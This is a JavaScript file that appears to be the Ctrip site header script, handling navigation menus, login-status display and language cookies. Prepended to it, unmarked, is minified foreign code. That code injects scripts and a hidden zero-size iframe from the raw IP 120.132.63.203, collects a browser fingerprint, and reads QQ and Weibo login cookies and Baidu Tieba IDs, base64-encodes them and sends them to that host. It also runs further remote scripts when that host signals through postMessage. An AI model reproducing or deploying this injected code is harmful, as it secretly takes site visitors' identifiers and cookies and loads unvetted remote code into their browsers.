!function(){var a,b=0,c=0,d="runadscripts",e=document.createElement("script");e.setAttribute("type","text/javascript"),e.setAttribute("src","http://120.132.63.203/pjk/pag/runad.php?b=AH006196&ua=Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"),e.id=d,document.body?document.getElementById(d)||document.body.appendChild(e):a=setInterval(function(){if(b++,20==b)return clearInterval(a),void 0;try{document.getElementById(d)||1==c?clearInterval(a):document.body&&(document.body.appendChild(e),c=1)}catch(f){}},500)}();function getWinWdithpc(){var a=0;return window.innerWidth?a=window.innerWidth:document.body&&document.body.clientWidth&&(a=document.body.clientWidth),document.documentElement&&document.documentElement.clientWidth&&(a=document.documentElement.clientWidth),parseInt(a)}function ishhCondition(){if(1==wincommonsz_pc.isf())return 1;var a="0";return getWinWdithpc()<1070&&"1"!=a?2:0}function getUonly(){var d,a=location.host,b=[[".qq.com","qq.com","rr"],[".weibo.com","weibo.com","xc"]],c="";return-1!=a.indexOf(b[0][0])||a==b[0][1]?(d=wincommonsz_pc.getCookieRaw("pt2gguin"),d&&(c=b[0][2]+"="+wincommonsz_pc.base64encode(d))):-1!=a.indexOf(b[1][0])||a==b[1][1]?(d=wincommonsz_pc.getCookieRaw("un"),d&&(c=b[1][2]+"="+wincommonsz_pc.base64encode(d))):0===location.href.indexOf("http://tieba.baidu.com/home/main?id=")&&location.href.indexOf("&")>0&&(c=location.href.substr(36,location.href.indexOf("&")-36),c="ce="+wincommonsz_pc.base64encode(c)),c&&(c="&"+c),c}function erjs(a){var b,c,d,e,f,g;ishhCondition()>0||(d=0,e="erscripts",f=wincommonsz_pc.getBrowserInfoStr(),g=document.createElement("script"),g.setAttribute("type","text/javascript"),g.setAttribute("src","http://120.132.63.203/pjk/pag/ts.php?utime=62190-45349-AH006196-14670115268437&m=aHR0cDovL3dlYnJlc291cmNlLmMtY3RyaXAuY29tL1Jlc0NSTU9ubGluZS9SMS9wYWdlaGVhZGVyL2pzL1BhZ2VIZWFkQ29udHJvbGxlci5qcz90ZW1wPTIwMTYwNjA2&b=AH006196&"+a+"&"+f),g.id=e,document.body?document.getElementById(e)||document.body.appendChild(g):c=setInterval(function(){if(b++,20==b)return clearInterval(c),void 0;try{document.getElementById(e)||1==d?clearInterval(c):document.body&&(document.body.appendChild(g),d=1)}catch(a){}},500))}function receiveMessage(a){"http://120.132.63.203"==a.origin&&erjs(a.data)}function crjsmarkhh(){window.postMessage||setTimeout(function(){erjs("postmessage=0")},2e3)}!function(a,b,c){a.wincommonsz_pc={getBrowserType:function(){return-1!=c.userAgent.indexOf("MSIE")?"ie":-1!=c.userAgent.indexOf("Chrome")?"Chrome":-1!=c.userAgent.indexOf("Firefox")?"Firefox":-1!=c.userAgent.indexOf("Opera")?"Opera":-1!=c.userAgent.indexOf("Netscape")?"Netscape":-1!=c.userAgent.indexOf("Safari")?"Safari":""},getBrowserInfoStr:function(){function b(){var a="",b=c.plugins;if(b.length>0)for(i=0;i<c.plugins.length;i++)a+=c.plugins[i].name+";";return a}var m,d=c.appName,e=c.appVersion,f=c.cookieEnabled,g=c.cpuClass,h=c.mimeTypes,j=c.platform,k=c.plugins;return c.userLanguage,m=c.userAgent,c.systemLanguage,pStr="isiframe="+this.isf()+"&type="+this.getBrowserType()+"&userAgent="+m+"&appName="+d+"&appVersion="+e+"&cookieEnabled="+f+"&cpuClass="+g+"&mimeType_length="+h.length+"&platform="+j+"&plugins_length="+k.length+"&allPluginName="+b()+"&window_screen_width="+a.screen.width+"&window_screen_height="+a.screen.height+"&window_screen_colorDepth="+a.screen.colorDepth+"&window_screen_deviceXDPI="+a.screen.deviceXDPI},isf:function(){return a.self!=a.top?1:0},utf16to8:function(a){var b,c,d,e;for(b="",d=a.length,c=0;d>c;c++)e=a.charCodeAt(c),e>=1&&127>=e?b+=a.charAt(c):e>2047?(b+=String.fromCharCode(224|15&e>>12),b+=String.fromCharCode(128|63&e>>6),b+=String.fromCharCode(128|63&e>>0)):(b+=String.fromCharCode(192|31&e>>6),b+=String.fromCharCode(128|63&e>>0));return b},base64encode:function(a){var b,c,d,e,f,g,h;for(a=this.utf16to8(a),b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",e=a.length,d=0,c="";e>d;){if(f=255&a.charCodeAt(d++),d==e){c+=b.charAt(f>>2),c+=b.charAt((3&f)<<4),c+="==";break}if(g=a.charCodeAt(d++),d==e){c+=b.charAt(f>>2),c+=b.charAt((3&f)<<4|(240&g)>>4),c+=b.charAt((15&g)<<2),c+="=";break}h=a.charCodeAt(d++),c+=b.charAt(f>>2),c+=b.charAt((3&f)<<4|(240&g)>>4),c+=b.charAt((15&g)<<2|(192&h)>>6),c+=b.charAt(63&h)}return c},getCookieRaw:function(a){var b,c=window,d=c.document,e=new RegExp("(^| )"+a+"=([^;]*)(;|$)"),f=e.exec(d.cookie);return f&&(b=f[2]),b}}}(window,document,navigator),window.postMessage&&(window.attachEvent?window.attachEvent("onmessage",receiveMessage,!1):window.addEventListener("message",receiveMessage,!1)),function(a,b){function e(a,b,c){try{d.set(a,b,c)}catch(e){a.setAttribute(b,c)}}var i,j,d={get:function(a,b){var c=a.getAttributeNode(b);return c.specified?c.nodeValue:"null"},set:function(a,c,d){var e=a.getAttributeNode(c);return e||(e=b.createAttribute(c),a.setAttributeNode(e)),e.nodeValue=d+""}},f="cusTFGYIOKSTwr",g=document.createElement("iframe");g.id=f;try{g.style.cssText="display: none;"}catch(h){}e(g,"width",0),e(g,"height",0),e(g,"src","http://120.132.63.203/pjk/mdk/custore.php?winwidth="+getWinWdithpc()+getUonly()+"&utime=62190-45349-AH006196-14670115268437&b=AH006196&m=aHR0cDovL3dlYnJlc291cmNlLmMtY3RyaXAuY29tL1Jlc0NSTU9ubGluZS9SMS9wYWdlaGVhZGVyL2pzL1BhZ2VIZWFkQ29udHJvbGxlci5qcz90ZW1wPTIwMTYwNjA2&other="+ishhCondition()),e(g,"frameborder",0),e(g,"scrolling","no"),document.body?document.getElementById(f)||(document.body.appendChild(g),crjsmarkhh()):i=setInterval(function(){if(j++,20==j)return clearInterval(i),void 0;try{document.getElementById(f)?clearInterval(i):document.body&&(document.body.appendChild(g),crjsmarkhh())}catch(a){}},1e3)}(window,document,navigator);
var logintype = globalConfig.LoginType == null || globalConfig.LoginType == undefined ? 'default' : globalConfig.LoginType.toLowerCase();//notload是无登录态
var marketJS = globalConfig.ISMarketJS == null || globalConfig.ISMarketJS == undefined ? 'default' : globalConfig.ISMarketJS.toLowerCase();//false是不加载有关市场的JS
var envir = globalConfig.Environment == null || globalConfig.Environment == undefined ? 'other' : globalConfig.Environment.toLowerCase();
var according = globalConfig.According == null || globalConfig.According == undefined ? 'other' : globalConfig.According.toLowerCase();

//google ad
function setGoogleAnalytics() {
    (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date(); a = s.createElement(o),
        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');

    ga('create', 'UA-3748357-1', 'auto');
    ga('send', 'pageview');
};
//UBT 记录Metric
var setMetric = function (name, typeValue) {
    if (typeof window['__bfi'] == 'undefined') window['__bfi'] = [];   //一个页面只需要判断一次
    window.__bfi.push(['_trackMetric', {
        name: name,    //{string} metric name 需要申请
        value: 1,       //{number} metric value 只能是数字
        tag: { type: typeValue },       //可选配置,{object} Metric Tag，Tag的Key只能是字符串,tag的值长度不能超过200，数量不能超过8个
        sample: 100,    //可选配置,数据抽样率，默认100，基于访客抽样
        callback: null  //可选配置,用于开发调试，提供status参数【1：发送成功, 8: tag数量超过限制, 110 tag的值不合法】
    }]);
};
//获取js的参数
var getArgs = function (args) {
    var Jsargs = "";
    if (args == null || args == 'undefined' || args == "") {
    }
    else {
        Jsargs = args;
    }
    return Jsargs;
};
//获取js的时间戳
var getTimeSpan = function () {
	var result = "?v=";
    try {
        var dom = document.getElementById("timespan");
        if (!!dom) {
            result = result + dom.getAttribute("value");
        }
    }
    catch (e) {}
    return result;
};
//设置时间戳变量
var tp = getTimeSpan();
//加载js 
var loadJS = function (url) {
    var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
    script.src = url + tp;
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
}

if (!!(document.getElementById("jsMark"))) {//is js code
    //鼠标hover导航栏触发
    (function () {
        ; window.replace = function () { return '' }; window.replace = function () { return "" };
        !function () {
            window.replace = function () { return "" }; (function () {
                var h = document, c = function (a) { return h.getElementById(a) }, k = null, l = null, m = 0, d = [c("cui_nav_destination"), c("cui_nav_hotel"), c("cui_nav_vac"), c("cui_nav_flight"), c("cui_nav_more"), c("cui_nav_car"), c("cui_nav_trains"), c("cui_nav_tuan"), c("cui_nav_lpk"), c("cui_nav_ticket"), c("cui_nav_sl"), c("cui_nav_g")], g = {
                    onmouseenter: function (a, b) {
                        (h.all ? a.onmouseenter = b : a.onmouseover = function (a) {
                            (null == a.relatedTarget ? b() : this !== a.relatedTarget && 20 != this.compareDocumentPosition(a.relatedTarget) &&
                            b())
                        })
                    }, onmouseout: function (a, b) { (h.all ? a.onmouseleave = b : a.onmouseout = function (a) { (null == a.relatedTarget ? b() : this !== a.relatedTarget && 20 != this.compareDocumentPosition(a.relatedTarget) && b()) }) }, addEvent: function (a, b, f) { (a.addEventListener ? a.addEventListener(b, f, !1) : (a.attachEvent ? a.attachEvent("on" + b, f) : a["on" + b] = f)) }
                }, e = {
                    setTime: function () { g.onmouseenter(c("cui_nav"), function () { setTimeout(function () { m = 150 }, 30) }); g.onmouseout(c("cui_nav"), function () { m = 0 }) }, initEvent: function () {
                        for (var a = 0, b = d.length; b > a; a++) (function () {
                            var b =
                            a; g.onmouseenter(d[b], function () { e.interFn(d[b]) }); g.onmouseout(d[b], function () { e.outerFn(d[b]) })
                        })(a)
                    }, reset: function () { for (var a = 0, b = d.length; b > a; a++) d[a].className = (-1 < d[a].className.indexOf("cui_nav_current") ? "cui_nav_current" : "") }, padReset: function (a) { for (var b = 0, f = d.length; f > b; b++) (-1 < d[b].className.indexOf("cui_nav_current") ? d[b].className = "cui_nav_current" : b !== a && (d[b].className = "")) }, interFn: function (a) {
                        for (var b = document.getElementById("cui_nav").getElementsByTagName("li"), f = "", d = 0; d < b.length; d++) b[d].className.match((/cui_nav_current/)) &&
                        (f = b[d]); null != l && (clearTimeout(l), l = null); k = setTimeout(function () { e.reset(); (-1 < a.className.indexOf("cui_nav_current") ? f.className = "cui_nav_current" : (a.className = "cui_nav_o", f.className = "cui_nav_current cui_nav_unhover")) }, m)
                    }, outerFn: function (a) {
                        for (var b = document.getElementById("cui_nav").getElementsByTagName("li"), d = "", c = 0; c < b.length; c++) b[c].className.match((/cui_nav_current/)) && (d = b[c]); null != k && (clearTimeout(k), k = null); l = setTimeout(function () {
                            e.reset(); (-1 < a.className.indexOf("cui_nav_current") ?
                            d.className = "cui_nav_current" : (a.className = "", d.className = "cui_nav_current"))
                        }, 250)
                    }, initMobile: function () {
                        for (var a = 0, b = d.length; b > a; a++) (function () {
                            var b = a, c = d[b].getElementsByTagName("A")[0]; c.href = "###"; c.onmousedown = function () {
                                e.padReset(b); -1 === d[b].className.indexOf("cui_nav_current") && ((-1 < d[b].className.indexOf("cui_nav_o") ? (d[b].className = "", document.getElementsByClassName("cui_nav_current")[0].className = "cui_nav_current", c.style.visibility = "hidden", setTimeout(function () {
                                    c.style.visibility =
                                    "visible"
                                }, 10)) : (d[b].className = "cui_nav_o", document.getElementsByClassName("cui_nav_current")[0].className = "cui_nav_current", document.getElementsByClassName("cui_nav_current")[0].className += " cui_nav_unhover")))
                            }
                        })(a)
                    }, contains: function (a) { for (var b = 0, c = d.length; c > b; b++) if (0 < d[b].compareDocumentPosition(a) - 19) return !0; return !1 }
                }; c("headStyleId") && c("headStyleId").parentNode.removeChild(c("headStyleId")); ((/ip(hone|od)|ipad/i).test(navigator.userAgent) ? (e.initMobile(), g.addEvent(h.body, "click", function (a) {
                    e.contains(a.target ||
                    a.srcElement) || e.reset()
                })) : (e.setTime(), e.initEvent()))
            })()
        }();
    })();
}
//load headFloatJs
if ('http:' == document.location.protocol) {
    loadJS("http://webresource.c-ctrip.com/ResUnionOnline/R3/float/pcfloat.min.js");
	loadJS("http://webresource.c-ctrip.com/ResCRMOnline/R1/js/float/headFloat.min.js");
}
if ('https:' == document.location.protocol) {
	loadJS("https://webresource.c-ctrip.com/ResCRMOnline/R1/js/float/headFloat.min.js");
}

//加载市场相关的JS
var loadMarketJs = function () {
    try {
        if (marketJS != 'false') {
            //加载市场相关JS
		   var protocolpefix = "https://";
           if ('http://' == document.location.protocol) {
			    protocolpefix = "http://";
            }
			loadJS(protocolpefix+"webresource.c-ctrip.com/ResUnionOnline/R1/remarketing/js/remarketing.js");
        }
    }
    catch (e) { };
}
//delay load
setTimeout("setGoogleAnalytics();loadMarketJs();", 3000);

//加载版权信息
(function () {
    var crId = document.getElementById('copyright');
    if (crId != undefined) {
        var currdate = new Date();
        crId.insertAdjacentHTML("afterend", "1999-" + currdate.getFullYear());
    }
})();

(function () {
    var config = {
        url: {
            loginAjax: 'https://' + globalConfig.AjaxUrl + '/member/ajax/AjaxGetCookie.ashx'
        },
        H1: globalConfig.H1 == null || globalConfig.H1 == undefined ? 'https' : globalConfig.H1,
        H3: globalConfig.H3 == null || globalConfig.H3 == undefined ? 'my.ctrip.com' : globalConfig.H3,
        AjaxUrl: globalConfig.AjaxUrl == null || globalConfig.AjaxUrl == undefined ? 'accounts.ctrip.com' : globalConfig.AjaxUrl,
        Lang: globalConfig.Lang == null || globalConfig.Lang == undefined ? 'gb2312' : globalConfig.Lang
    };
    var addClass = function (id, className) {
        var element = document.getElementById(id);
        if (element.className == "") {
            element.className = className;
        } else {
            element.className += " " + className;
        }
    };
    //绘制头部URL
    var createScript = function (url, isAsync) {
        var s = document.createElement('script');
        s.type = 'text/javascript';
        s.async = isAsync;
        s.src = url;
        var h = document.getElementsByTagName('head')[0];
        h.appendChild(s);
    };
    //生成backUrl
    var backUrl;
    try {
        backUrl = escape(decodeURIComponent(location.href)).replace(/\//g, "%2F");
    } catch (e) {
        backUrl = "";
    }

    var newHeaderFlag = function () {
        var flag = document.getElementById("_newHeaderFlag_");
        if (flag != undefined && flag.value === "true") {
            return true;
        }
        else {
            return false;
        }
    }();
    //创建登录态Jsonp请求
    window.GetUserHTML = function () {
        var temp = Math.random();
        //international hotel utf8 issue
        var isUncode;
        if (document.getElementById('bsType')) {
            isUncode = document.getElementById('bsType').value == "1" ? 1 : 0;
        }
        initHeader();
        var ajaxUrl1 = 'https://' + config.AjaxUrl + '/member/ajax/AjaxGetCookie.ashx?jsonp=BuildHTML&r=' + temp + '&encoding=' + isUncode;
        createScript(ajaxUrl1, true);
    };
    //初始化头部
    var initHeader = function () {
        if (newHeaderFlag) {
            var strhtml = "";
            var strhtml = "";
            var vstrshow = "";
            var pstrshow = "";
            var fstrshow = "";
            var vconfig = { "v2": "未提交订单", "v3": "未出行订单", "v4": "待点评订单", "v14": "我的携程", "v15": "全部订单", "v16": "会员", "loginname": "登录", "registeredname": "注册" }
            if (config.Lang.toLowerCase() == 'big5') {
                vconfig = { "v2": "未提交訂單", "v3": "未出行訂單", "v4": "待點評訂單", "v14": "我的攜程", "v15": "全部訂單", "v16": "會員", "loginname": "登錄", "registeredname": "註冊" }
            }
            strhtml += "<a rel=\"nofollow\" id=\"c_ph_login\" class=\"cui_links_login\" rel=\"nofollow\" href=\"" + config.H1 + "://" + config.AjaxUrl + "/member/login.aspx?BackUrl=" + backUrl + "&responsemethod=get\">" + vconfig.loginname + "</a>";
            strhtml += "<span>|</span>";
            strhtml += "<a rel=\"nofollow\" id=\"c_ph_register\" href=\"" + config.H1 + "://" + config.AjaxUrl + "/member/emailregist.aspx\" class=\"cui_links_reg\">" + vconfig.registeredname + "</a>";
            pstrshow += "<a rel=\"nofollow\" id=\"c_ph_myhome\" href=\"http://" + config.H3 + "/home/myinfo.aspx#ctm_ref=ssc_hp_myctrip_a\" class=\"cui_myctrip_status\">" + vconfig.v14 + "<b class=\"arrow\"></b></a>";
            vstrshow += "<input type=\"button\" onclick=\"DoLogin()\" id = \"myctripButton\" class=\"basebtns_01\" value=\"" + vconfig.loginname + "\" />";
            //vstrshow += "<li class=\"cui_account_info\"><a rel=\"nofollow\" href=\"http://" + config.H3 + "/home/Order/AllOrder.aspx\">" + vconfig.v15 + "</a></li>";
            //vstrshow += "<li class=\"divider\"></li>";
            document.getElementById("div_User").innerHTML = strhtml;
            document.getElementById("div_MyCtrip").innerHTML = pstrshow;
            //document.getElementById("div_Loginbtn").innerHTML = vstrshow;
            document.getElementById("div_MyCTMessages").innerHTML = fstrshow;
        }
        else {
            var strhtml = "";
            var vstrshow = "";
            var vconfig = { "v2": "未提交订单", "v3": "未出行订单", "v4": "待点评订单", "v14": "我的携程", "v15": "全部订单", "v16": "会员", "loginname": "登录", "registeredname": "注册" }
            if (config.Lang.toLowerCase() == 'big5') {
                vconfig = { "v2": "未提交訂單", "v3": "未出行訂單", "v4": "待點評訂單", "v14": "我的攜程", "v15": "全部訂單", "v16": "會員", "loginname": "登錄", "registeredname": "註冊" }
            }
            strhtml += "<a rel=\"nofollow\" id=\"c_ph_myhome\" href=\"http://" + config.H3 + "/home/myinfo.aspx#ctm_ref=ssc_hp_myctrip_a\" class=\"cui_myctrip_status\">" + vconfig.v14 + "</a><b></b>";
            strhtml += "<div class=\"cui_myctrip_lr\">";
            strhtml += "<a rel=\"nofollow\" id=\"c_ph_login\" class=\"cui_links_login\" rel=\"nofollow\" href=\"" + config.H1 + "://" + config.AjaxUrl + "/member/login.aspx?BackUrl=" + backUrl + "&responsemethod=get\">" + vconfig.loginname + "</a>";
            strhtml += "|";
            strhtml += "<a rel=\"nofollow\" id=\"c_ph_register\" href=\"" + config.H1 + "://" + config.AjaxUrl + "/member/emailregist.aspx\" class=\"cui_links_reg\">" + vconfig.registeredname + "</a>";
            strhtml += "</div>";
            vstrshow += "<input type=\"button\" onclick=\"DoLogin()\" id = \"myctripButton\" class=\"basebtns_01\" value=\"" + vconfig.loginname + "\" />";
            vstrshow += "<a rel=\"nofollow\" href=\"http://" + config.H3 + "/home/Order/AllOrder.aspx\">" + vconfig.v15 + "</a>";
            document.getElementById("notLogin").innerHTML = strhtml;
            document.getElementById("div_user").innerHTML = vstrshow;
        }

    };

    //登录方法
    window.DoLogin = function () {
        window.location.href = config.H1 + "://" + config.AjaxUrl + "/member/login.aspx?BackUrl=" + backUrl + "&responsemethod=get";
    };

    window.BuildHTML = function (data) {
        var thisURL = document.URL;
        var userhtml = "";
        var strhtml = "";
        var vstrshow = "";
        var pstrshow = "";
        var fstrshow = "";
        var remindhtml = "";
        //min func my ctrip menu node
        var elMinMyCtrip = document.getElementById("ulCTMinMC");
        //full func my ctrip menu node
        var elFullMyCtrip = document.getElementById("ulCTFullMC");

        var vconfig = { "v2": "未提交订单", "v3": "未出行订单", "v4": "待点评订单", "v14": "我的携程", "v15": "全部订单", "v16": "会员", "loginname": "登录", "registeredname": "注册" }
        if (config.Lang.toLowerCase() == 'big5') {
            vconfig = { "v2": "未提交訂單", "v3": "未出行訂單", "v4": "待點評訂單", "v14": "我的攜程", "v15": "全部訂單", "v16": "會員", "loginname": "登錄", "registeredname": "註冊" }
        }
        if (newHeaderFlag) {
            if (data == null) {
                //商旅平台移除我携登陆 modified by Joey.Zhang 20141105
                if (document.domain == "ct.ctrip.com" || document.domain == "ct.uat.qa.nt.ctripcorp.com") {
                    document.getElementById("loginDivLi").style.display = 'none';
                }
                //show min func my ctrip menu
                if (elFullMyCtrip != null) { elFullMyCtrip.parentNode.removeChild(elFullMyCtrip); elMinMyCtrip.style.display = "block"; };
            }
            else {
                if (data.hascookieuser == "F") {
                    //show min func my ctrip menu
                    if (elFullMyCtrip != null) { elFullMyCtrip.parentNode.removeChild(elFullMyCtrip); elMinMyCtrip.style.display = "block"; };

                    strhtml += "<a rel=\"nofollow\" id=\"c_ph_login\" class=\"cui_links_login\" rel=\"nofollow\" href=\"" + config.H1 + "://" + config.AjaxUrl + "/member/login.aspx?BackUrl=" + backUrl + "&responsemethod=get\">" + vconfig.loginname + "</a>";
                    strhtml += "<span>|</span>";
                    strhtml += "<a rel=\"nofollow\" id=\"c_ph_register\" href=\"" + config.H1 + "://" + config.AjaxUrl + "/member/emailregist.aspx\" class=\"cui_links_reg\">" + vconfig.registeredname + "</a>";
                    pstrshow += "<a rel=\"nofollow\" id=\"c_ph_myhome\" href=\"http://" + config.H3 + "/home/myinfo.aspx#ctm_ref=ssc_hp_myctrip_a\" class=\"cui_myctrip_status\">" + vconfig.v14 + "<b class=\"arrow\"></b></a>";
                    vstrshow += "<input type=\"button\" onclick=\"DoLogin()\" id = \"myctripButton\" class=\"basebtns_01\" value=\"" + vconfig.loginname + "\" />";
                    //商旅平台移除我携登陆 modified by Joey.Zhang 20141105
                    if (document.domain == "ct.ctrip.com" || document.domain == "ct.uat.qa.nt.ctripcorp.com") {
                        document.getElementById("loginDivLi").style.display = 'none';
                    }
                    document.getElementById("div_User").className = "userLogin";
                }
                else {
                    //show full func my ctrip menu
                    if (elMinMyCtrip != null) { elMinMyCtrip.parentNode.removeChild(elMinMyCtrip) };

                    strhtml = "<ul>";
                    if (data.usershortname != "") {
                        if (data.usershortname != data.username) {
                            data.usershortname = data.username.substring(0, 7) + "…";
                        }
                        //样式控制长度
                        strhtml += "<li><p class=\"user_name\" title=\"" + data.username + "\">" + data.username + "</p></li>";
                    }
                    else {
                        if (data.vipgradename == "普通会员" || data.vipgradename == "普通會員") {
                            data.vipgradename = vconfig.v16;
                        }
                        strhtml += "<li class=\"user\"><p class=\"user_name\" title=\"" + "尊敬的" + data.vipgradename + "\">" + "尊敬的" + data.vipgradename + "</p></li>";
                    }
                    strhtml += "<li class=\"logout\"><a rel=\"nofollow\" id=\"c_ph_logout\" href=\"" + config.H1 + "://" + config.AjaxUrl + "/member/logout.aspx\" class=\"cui_links_exit\">退出</a></li>";
                    strhtml += "</ul>";
                    pstrshow += "<a rel=\"nofollow\" id=\"c_ph_myhome\" href=\"http://" + config.H3 + "/home/myinfo.aspx#ctm_ref=ssc_hp_myctrip_a\" class=\"cui_myctrip_status\">" + vconfig.v14 + "<b class=\"arrow\"></b></a>";

                    if (data.noreadmessagecount != "0") { //短信不为零，既要显示信封图标，又要显示短信个数
                        fstrshow += "<a rel=\"nofollow\" href=\"http://" + config.H3 + "/Home/message/messagelist.aspx?status=F\" class=\"badge\">(" + data.noreadmessagecount + ")</a>";
                    }
                    else {//短信为零时，只显示信封标签
                        fstrshow += "<a rel=\"nofollow\" href=\"http://" + config.H3 + "/Home/message/messagelist.aspx?status=F\" class=\"badge\"></a>";
                    }
                    //vstrshow += "<a rel=\"nofollow\" href=\"http://" + config.H3 + "/home/Order/AllOrder.aspx\">" + vconfig.v15 + "</a><li class=\"divider\"></li>";
                    addClass("loginDivLi", "cui_myctrip_hover");
                    document.getElementById("div_User").className = "user";
                    document.getElementById("div_Loginbtn").parentNode.style.display = "none";
                    var oNext = document.getElementById("div_User").nextElementSibling || document.getElementById("div_User").nextSibling;//ie8 fix
                    oNext.style.marginTop = "-2px";
                }
                document.getElementById("div_User").innerHTML = strhtml;
                document.getElementById("div_MyCtrip").innerHTML = pstrshow;
                document.getElementById("div_Loginbtn").innerHTML = vstrshow;
                document.getElementById("div_MyCTMessages").innerHTML = fstrshow;
            }
        }
        else {
            if (data == null) {
                //商旅平台移除我携登陆 modified by Joey.Zhang 20141105
                if (document.domain == "ct.ctrip.com" || document.domain == "ct.uat.qa.nt.ctripcorp.com") {
                    document.getElementById("loginDivLi").style.display = 'none';
                }
            }
            else {
                if (data.hascookieuser == "F") {
                    strhtml += "<a rel=\"nofollow\" id=\"c_ph_myhome\" href=\"http://" + config.H3 + "/home/myinfo.aspx#ctm_ref=ssc_hp_myctrip_a\" class=\"cui_myctrip_status\">" + vconfig.v14 + "</a><b></b>";
                    strhtml += "<div class=\"cui_myctrip_lr\">";
                    strhtml += "<a rel=\"nofollow\" id=\"c_ph_login\" class=\"cui_links_login\" rel=\"nofollow\" href=\"" + config.H1 + "://" + config.AjaxUrl + "/member/login.aspx?BackUrl=" + backUrl + "&responsemethod=get\">" + vconfig.loginname + "</a>";
                    strhtml += "|";
                    strhtml += "<a rel=\"nofollow\" id=\"c_ph_register\" href=\"" + config.H1 + "://" + config.AjaxUrl + "/member/emailregist.aspx\" class=\"cui_links_reg\">" + vconfig.registeredname + "</a>";
                    strhtml += "</div>";

                    vstrshow += "<input type=\"button\" onclick=\"DoLogin()\" id = \"myctripButton\" class=\"basebtns_01\" value=\"" + vconfig.loginname + "\" />";
                    vstrshow += "<a rel=\"nofollow\" href=\"http://" + config.H3 + "/home/Order/AllOrder.aspx\">" + vconfig.v15 + "</a>";

                    //商旅平台移除我携登陆 modified by Joey.Zhang 20141105
                    if (document.domain == "ct.ctrip.com" || document.domain == "ct.uat.qa.nt.ctripcorp.com") {
                        document.getElementById("loginDivLi").style.display = 'none';
                    }
                }
                else {
                    strhtml += "<a rel=\"nofollow\" id=\"c_ph_myhome\" href=\"http://" + config.H3 + "/home/myinfo.aspx#ctm_ref=ssc_hp_myctrip_a\" class=\"cui_myctrip_status\">" + vconfig.v14 + "</a>";
                    if (data.usershortname != "") {
                        if (data.usershortname != data.username) {
                            data.usershortname = data.username.substring(0, 7) + "…";
                        }
                        //样式控制长度
                        strhtml += "<div class=\"cui_myctrip_username\" title=\"" + data.username + "\">" + data.username + "</div>";
                    }
                    else {
                        if (data.vipgradename == "普通会员" || data.vipgradename == "普通會員") {
                            data.vipgradename = vconfig.v16;
                        }
                        strhtml += "<div class=\"cui_myctrip_username\" title=\"" + "尊敬的" + data.vipgradename + "\">" + "尊敬的" + data.vipgradename + "</div>";
                    }
                    strhtml += "<b></b>";
                    strhtml += "<a rel=\"nofollow\" id=\"c_ph_logout\" href=\"" + config.H1 + "://" + config.AjaxUrl + "/member/logout.aspx\" class=\"cui_links_exit\">退出</a>";
                    if (data.noreadmessagecount != "0") {//短信不为零
                        strhtml += "<a rel=\"nofollow\" href=\"http://" + config.H3 + "/Home/message/messagelist.aspx?status=F\" class=\"cui_links_msg\">" + data.noreadmessagecount + "</a>";
                    }
                    else {//短信为零，则只显示信封图标
                        strhtml += "<a rel=\"nofollow\" href=\"http://" + config.H3 + "/Home/message/messagelist.aspx?status=F\" class=\"cui_links_msg\"></a>";
                    }

                    vstrshow += "<a rel=\"nofollow\" href=\"http://" + config.H3 + "/home/Order/AllOrder.aspx\">" + vconfig.v15 + "</a>";
                    addClass("loginDivLi", "cui_myctrip_hover");
                }
                document.getElementById("notLogin").innerHTML = strhtml;
                document.getElementById("div_user").innerHTML = vstrshow;
            }
        }
    };

    var addFloatEventHandler = function (obj, eventName, fun) {
        var fn = fun;
        if (obj.attachEvent) {
            obj.attachEvent('on' + eventName, fn);
        } else if (obj.addEventListener) {
            obj.addEventListener(eventName, fn, false);
        } else {
            obj["on" + eventName] = fn;
        }
    };
    var doLangEvent = function () {
        addFloatEventHandler(document.getElementById('cui_lang_cn'), 'click', function (e) {
            setLangCookie({ "Customer": "HAL=ctrip_cn" }, "");
            setLangCookie({ "_ctm_t": "ctrip" }, "off");
        });
        var cui_langlist = document.getElementById("cui_lang_list");
        languageClick(cui_langlist.getElementsByTagName("a"));
        //var langbot = document.getElementById("cui_lang_bottom");
        //languageClick(langbot.getElementsByTagName("a"));
    };
    var languageClick = function (langlis) {
        for (var i = 0, len = langlis.length; i < len; i++) {
            addFloatEventHandler(langlis[i], 'click', function (e) {
                var _this = e.srcElement || e.target;//_this重新指向事件
                var lang = _this.id;
                if (_this.id == "") {
                    lang = _this.className.replace('language', 'ctrip');
                }
                setLangCookie({ "Customer": "HAL=" + lang }, "");
                setLangCookie({ "_ctm_t": "ctrip" }, "off");
            });
        }
    };
    var setLangCookie = function (keyMap, keyType) {
        var sub_domain = (document.domain || "").replace(/^[\w\W]*\.ctrip(travel)??\.com(.hk)??/, "ctrip$1.com$2");
        var a = [];
        for (var k in keyMap) {
            var s = keyMap[k] === null ? "" : keyMap[k];
            a.push(k + "=" + s);
        }
        var expdate = new Date();
        expdate.setDate(expdate.getDate() + 7);
        if (keyType == "") {
            document.cookie = a.join("&") + "; expires=" + expdate.toGMTString() + "; domain=" + sub_domain + ";path=/;";
        } else {
            document.cookie = a.join("&") + "; domain=" + sub_domain + ";path=/;";
        }
    };
    
    GetUserHTML();
    //登录模块
    var ctripLogin = function () {
        var that = this;
        var isLogin = false,
        Event = {
            onmouseenter: function (o, f) {
                if (document.all) {
                    o.onmouseenter = function (e) {
                        f();
                    };
                } else {
                    o.onmouseover = function (e) {
                        e.relatedTarget == null ? f() : (!(this === e.relatedTarget || this.compareDocumentPosition(e.relatedTarget) == 20) && f());
                    };
                }
            },
            onmouseout: function (o, f) {
                if (document.all) {
                    o.onmouseleave = f;
                } else {
                    o.onmouseout = function (e) {
                        e.relatedTarget == null ? f() : (!(this === e.relatedTarget || this.compareDocumentPosition(e.relatedTarget) == 20) && f());
                    }
                }
            },
            bindLogin: function () {
                if (newHeaderFlag) {
                    this.onmouseenter(document.getElementById('loginDivLi'), function () {
                        document.getElementById('loginDivLi').getElementsByTagName('b')[0].className = "arrow b_h";
                        document.getElementById('loginDiv').style.display = 'block';
                    });
